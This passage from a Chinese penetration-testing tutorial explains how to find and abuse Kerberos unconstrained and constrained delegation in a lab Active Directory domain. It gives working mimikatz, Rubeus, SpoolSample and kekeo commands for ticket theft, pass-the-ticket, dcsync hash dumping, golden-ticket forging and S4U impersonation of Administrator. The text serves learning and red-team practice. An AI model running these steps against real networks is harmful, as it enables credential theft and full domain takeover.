@@ -1,0 +1,379 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="cf3ab6493aaac7feebdd6a8ca6e44992">前置知识</h2>
+<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
+<p>委派主要分为非约束委派<code>(Unconstrained delegation)</code>和约束委派<code>(Constrained delegation)</code>两个方式，还有一种是基于资源的约束委派（<code>Resource Based Constrained Delegation</code>）不过不是本文的重点，下面我们来分别介绍一下非约束委派和约束委派这两种方法的利用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211220455-7afcc3f0-4cd7-1.png"/></p>
+<h2 data-content="1" id="7dcbc9d11659731baa747af0ef838454">发现域中委派的用户和计算机</h2>
+<h3 data-content="1" id="b29d03c351fb501a9b9c6ccf2cc8733b">原理说明</h3>
+<ul>
+<li>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code>
+</li>
+<li>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</li>
+</ul>
+<p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206162116-a4dd0f4e-48b9-1.png"/></p>
+<p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206162614-56b431d4-48ba-1.png"/></p>
+<p>下面介绍三种比较常见方法用于查找域中委派的用户和计算机</p>
+<h3 data-content="1" id="e98fb3f44617ef7aaf543997640d868c">非约束委派的查找</h3>
+<h4 data-content="1" id="c182664d71a5b1e75114bdbe02371509">ldapsearch</h4>
+<blockquote>
+<p>kali上自带，适合在域外查询</p>
+</blockquote>
+<p>这个参数过多就不一一列举了，需要查阅的<code>ldapsearch -h</code>即可</p>
+<p>查找域中配置非约束委派的用户：</p>
+<pre><code>ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"</code></pre>
+<p>过滤条件</p>
+<pre><code>(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206165316-1da1e568-48be-1.png"/></p>
+<p>查找域中配置非约束委派的主机：</p>
+<pre><code>ldapsearch -x -H ldap://192.168.141.145:389 -D "CN=qiyou,CN=Users,DC=qiyou,DC=com" -w password -b "DC=qiyou,DC=com" "(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"</code></pre>
+<p><strong>注</strong>：域控主机账户默认开启非约束委派</p>
+<p>过滤条件</p>
+<pre><code>(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))</code></pre>
+<p><strong>注</strong>：更多LDAP的过滤语法请参考微软的手册：<a href="https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx?Sort=MostUseful" target="_blank">地址</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206163923-2d25d118-48bc-1.png"/></p>
+<p><strong>注</strong>：区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p>
+<h4 data-content="1" id="84f3de149e4eaf314ae0adfe5eab347b">ADFind</h4>
+<p>使用参数</p>
+<pre><code>AdFind [switches] [-b basedn] [-f filter] [attr list]</code></pre>
+<p>参数说明：</p>
+<ul>
+<li>-b：指定要查询的根节点</li>
+<li>-f：LDAP过滤条件</li>
+<li>attr list：需要显示的属性</li>
+</ul>
+<p>查找域中配置非约束委派的用户：</p>
+<pre><code>AdFind.exe -b "DC=qiyou,DC=com" -f "(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211171505-fdc6fd1a-4cae-1.png"/></p>
+<p>查找域中配置非约束委派的主机：</p>
+<pre><code>AdFind.exe -b "DC=qiyou,DC=com" -f "(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211171701-43418342-4caf-1.png"/></p>
+<h4 data-content="1" id="f6be40f9fe1ae1c0a7702903a9c96029">PowerView</h4>
+<p>查找域中配置非约束委派用户</p>
+<pre><code>Get-NetUser -Unconstrained -Domain qiyou.com |select name</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205215906-acc0ea0e-481f-1.png"/></p>
+<p>查找域中配置非约束委派的主机：</p>
+<pre><code>Get-NetComputer -Unconstrained -Domain qiyou.com</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205220057-ee88c01a-481f-1.png"/></p>
+<p>查询域中配置非约束委派的主机（另外一个版本的powerview）：</p>
+<pre><code>Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose | ft -Wrap -AutoSize</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205220213-1bd856d4-4820-1.png"/></p>
+<h3 data-content="1" id="730ffd0fe69ebcd74a84d75abc23c921">约束委派</h3>
+<h4 data-content="1" id="5407af60008c232b96a5e65fa8fc00f1">ldapsearch</h4>
+<p>查找域中配置约束委派用户</p>
+<div class="highlight"><pre><span></span>ldapsearch -x -H ldap://192.168.141.145:389 -D <span class="s2">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="s2">"DC=qiyou,DC=com"</span> <span class="s2">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> <span class="p">|</span>grep -iE <span class="s2">"distinguishedName|allowedtodelegateto"</span>
+</pre></div>
+<p>过滤条件</p>
+<pre><code>(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206165805-c9d9c512-48be-1.png"/></p>
+<p>查找域中配置约束委派的主机：</p>
+<div class="highlight"><pre><span></span>ldapsearch -x -H ldap://192.168.141.145:389 -D <span class="s2">"CN=qiyou,CN=Users,DC=qiyou,DC=com"</span> -w password -b <span class="s2">"DC=qiyou,DC=com"</span> <span class="s2">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> <span class="p">|</span>grep -iE <span class="s2">"distinguishedName|allowedtodelegateto"</span>
+</pre></div>
+<p>过滤条件</p>
+<pre><code>(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206164433-e5901240-48bc-1.png"/></p>
+<h4 data-content="1" id="549bf2db8f49277e03e39411403efd48">ADFind</h4>
+<p>查找域中配置约束委派用户</p>
+<pre><code>AdFind.exe -b "DC=qiyou,DC=com" -f "(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211172106-d50ce7da-4caf-1.png"/></p>
+<p>查找域中配置约束委派的主机：</p>
+<pre><code>AdFind.exe -b "DC=qiyou,DC=com" -f "(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211172239-0c56c080-4cb0-1.png"/></p>
+<h4 data-content="1" id="d8172601db38f59d624fcc1277794079">PowerView</h4>
+<p><strong>注</strong>：Powerview有两个版本，一个在dev分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank">地址</a>，一个在master分支：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">地址</a></p>
+<p>查找域中配置约束委派用户</p>
+<pre><code>Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206170357-9bafde5a-48bf-1.png"/></p>
+<p>查找域中配置约束委派的主机：</p>
+<pre><code>Get-DomainComputer -TrustedToAuth -Domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200205223329-7a841d9a-4824-1.png"/></p>
+<h2 data-content="1" id="fbc6062634520b02c4839e5ca8ca547d">非约束委派的利用</h2>
+<h3 data-content="1" id="75265bd14a68847627352bdd731e4398">概述</h3>
+<p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
+<p>非约束委派的请求过程（图来自微软手册）：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206130430-2805d11a-489e-1.png"/></p>
+<p>上图的Kerberos请求描述分为如下步骤：</p>
+<pre><code>1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。
+
+2. KDC在`KRB_AS_REP`消息中返回`TGT1`。
+
+3. 用户根据步骤2中的TGT1请求转发TGT2。
+
+4. KDC在KRB_TGS_REP消息中为user返回TGT2。
+
+5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）
+
+6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。
+
+7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey
+
+8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。
+
+9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。
+
+10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。
+
+11. service2响应service1的请求。
+
+12. 有了这个响应，service1就可以在步骤7中响应用户的请求。
+
+13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。
+
+14. KDC返回步骤13中请求的ST
+
+15-16. service1以用户的名义来请求其它服务</code></pre>
+<p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p>
+<h3 data-content="1" id="ea4cbb78c02a9518eb5f4229517d1334">操作</h3>
+<p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code>
+</li>
+<li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code>
+</li>
+<li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code>
+</li>
+</ul>
+<p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
+<p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派（注意是：主机用户而不是服务用户，多谢评论区的<code>3t2ugg1e</code>师傅指正）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200229223822-22b87436-5b01-1.png"/></p>
+<p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p>
+<p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211111033-1160a96c-4c7c-1.png"/></p>
+<p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p>
+<pre><code>privilege::debug 
+sekurlsa::tickets /export</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211110803-b7eafc16-4c7b-1.png"/></p>
+<p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p>
+<p>此时我们访问域控是被拒绝的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112007-67121a34-4c7d-1.png"/></p>
+<p>然后通过ptt将TGT注入到当前会话中</p>
+<pre><code>kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code></pre>
+<p>成功访问</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211111640-eb9fe46c-4c7c-1.png"/></p>
+<p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112457-14599c12-4c7e-1.png"/></p>
+<p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p>
+<pre><code>Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</code></pre>
+<ul>
+<li>
+<code>-ComputerName</code>指定主机名</li>
+<li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code>
+</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112640-514590cc-4c7e-1.png"/></p>
+<p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。</p>
+<h3 data-content="1" id="17751937123ace530aad186d2cfc3a84">非约束委派+Spooler打印机服务</h3>
+<p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p>
+<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p>
+<p>演讲PPT：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory" target="_blank">地址</a></p>
+<p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
+<p>请求过程如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210232526-900988fa-4c19-1.png"/></p>
+<blockquote>
+<p>图来源于：<a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank">http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
+</blockquote>
+<p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211000739-75ec4826-4c1f-1.png"/></p>
+<p><strong>注</strong>：我在<code>windows server 2008</code>上操作没有成功，不知道是我的问题还是有版本限制，按照上面的原理来说应该是没有版本限制的，不过把域环境重新配置了一遍，域控换成了<code>windows server 2012R2</code>就成功了</p>
+<p>操作环境：</p>
+<ul>
+<li>域：<code>test.local</code>
+</li>
+<li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code>
+</li>
+<li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code>
+</li>
+</ul>
+<p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p>
+<p>我们给win10这个主机账户开启非约束委派</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210231239-c749c250-4c17-1.png"/></p>
+<p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p>
+<p><code>tifkin_</code>在他的github上开源了POC：<a href="https://github.com/leechristensen/SpoolSample" target="_blank">https://github.com/leechristensen/SpoolSample</a></p>
+<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
+<pre><code>SpoolSample.exe dm2012 win10</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211001236-272ec7d0-4c20-1.png"/></p>
+<p>我们可以用<code>Rubeus</code>来监听<code>Event ID</code>为<code>4624</code>事件，这样可以第一时间截取到域控的TGT</p>
+<p>每隔一秒监听一次来自<code>dm2012</code>的登陆（需要本地管理员权限）</p>
+<pre><code>Rubeus.exe monitor /interval:1 /filteruser:dm2012$</code></pre>
+<p><strong>注</strong>：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，<code>Rubeus</code>可以直接将base64编码的票据直接注入到内存中</p>
+<pre><code>Rubeus.exe ptt /ticket:base64</code></pre>
+<p>因为之前域内主机win10的安全日志被我搞崩了，所以这里就不演示了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210222255-d446d31e-4c10-1.png"/></p>
+<p>因为我们Rubeus监听TGT用不了，所以我们可以用<code>mimikatz</code>导出TGT</p>
+<pre><code>privilege::debug
+
+sekurlsa::tickets /export</code></pre>
+<p>可以发现成功导出来自<code>DM2012$</code>的TGT</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210220650-94f45f80-4c0e-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211002536-f7dcc0c0-4c21-1.png"/></p>
+<p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p>
+<pre><code>kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi
+
+lsadump::dcsync /domain:test.local /all /csv</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211002107-57633dd6-4c21-1.png"/></p>
+<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
+<pre><code>kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</code></pre>
+<p>成功以administrator的身份访问域控</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211004433-9d945bd4-4c24-1.png"/></p>
+<p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211004601-d257f3e4-4c24-1.png"/></p>
+<p>关于<code>Spooler</code>服务的利用还有<code>CVE-2019-1040</code>，不过这个是基于资源的约束委派，有兴趣的同学可以去了解一下</p>
+<h2 data-content="1" id="6b0b4e304d9a4edbaa69ad1a179d33b1">约束委派的利用</h2>
+<h3 data-content="1" id="824ab369d122019cb9dbc441a225e286">概述</h3>
+<p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
+<p><code>S4U2Self</code>和<code>S4U2proxy</code>的请求过程（图来自微软手册）：</p>
+<p><strong>注</strong>：其中步骤1-4代表<code>S4U2Self</code>请求的过程，步骤5-10代表<code>S4U2proxy</code>的请求过程</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200207103902-002e844c-4953-1.png"/></p>
+<p>上述请求的文字描述：</p>
+<pre><code>1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。
+
+2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。
+
+3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。
+
+4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。
+注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了
+
+5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。
+
+6. service1以用户的名义向KDC请求用户访问service2的ST2
+
+7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。
+
+8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。
+
+9. service2响应步骤8的请求。
+
+10. service1响应用户对步骤5中的请求。</code></pre>
+<h3 data-content="1" id="94c0628946c349ce9aeedcc94e32402e">操作</h3>
+<p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code>
+</li>
+<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code>
+</li>
+<li>域内主机：<code>DM08</code>
+</li>
+</ul>
+<p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208162356-59615fcc-4a4c-1.png"/></p>
+<p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p>
+<p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
+<pre><code>tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</code></pre>
+<p>参数：</p>
+<p><code>/user</code>: 服务用户的用户名</p>
+<p><code>/password</code>: 服务用户的明文密码</p>
+<p><code>/domain</code>: 所在域名</p>
+<p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208132812-cce6165e-4a33-1.png"/></p>
+<p>得到服务用户TGT：<code>TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi</code></p>
+<p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p>
+<pre><code>tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208133328-88ef2eb2-4a34-1.png"/></p>
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
+<p>然后我们用mimikatz将ST2导入当前会话即可</p>
+<pre><code>kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</code></pre>
+<p>成功访问到dm08的cifs服务</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208135043-f1a80198-4a36-1.png"/></p>
+<p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p>
+<p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p>
+<p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p>
+<pre><code>tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec
+tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208165346-847a63c6-4a50-1.png"/></p>
+<pre><code>kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208165529-c1e160f2-4a50-1.png"/></p>
+<p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p>
+<pre><code>mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208171625-ae0701f6-4a53-1.png"/></p>
+<p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
+<p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p>
+<pre><code>tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208172530-f34096f0-4a54-1.png"/></p>
+<pre><code>kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208172423-cae97370-4a54-1.png"/></p>
+<p>我们来抓包看一下整个委派请求的过程</p>
+<p>可以看到有6个请求响应的过程，我们可以分为3步来分析</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165154-c0c23590-4cab-1.png"/></p>
+<ol>
+<li>可以看到用户<code>qiyou</code>首先向KDC请求一张TGT，<code>AS-REP</code>请求里返回TGT，这张TGT代表的是qiyou这个用户</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165502-30b415da-4cac-1.png"/></p>
+<p>2 然后用这张<code>TGT</code>发送<code>S4U2self</code>请求，以<code>Administrator</code>的名义向<code>TGS</code>申请了一张访问自身服务的票据，我们这里就称为ST1吧</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165823-a87b2da6-4cac-1.png"/></p>
+<ol>
+<li>得到<code>ST1</code>之后，然后会带上ST1再次向<code>KDC</code>发起<code>SU42Proxy</code>请求，以<code>administrator</code>的名义请求一张访问<code>DM08 cifs</code>服务的票据，我们这里就称为<code>ST2</code>吧</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211170205-2cc5d624-4cad-1.png"/></p>
+<p>上述数据包请求过程中：第一步对应的是我们kekeo的<code>tgt::ask</code>；2-3是对应<code>tgs::s4u</code>，其中ST1和ST2分别对应的就是kekeo生成的<code>TGS_Administrator@qiyou.com@QIYOU.COM_qiyou@QIYOU.COM.kirbi</code>和<code>TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</code>，不过我们最终用到是ST2，ST1可以看作一个中间产物。</p>
+<p>得到ST2之后我们就可以回到我们的攻击机上进行ptt就能得到<code>DM08 cifs</code>的访问权限了</p>
+<h3 data-content="1" id="3bef02aadd56db72912e902587b09864">利用约束委派生成黄金票据</h3>
+<p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code>
+</li>
+<li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code>
+</li>
+<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code>
+</li>
+</ul>
+<p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
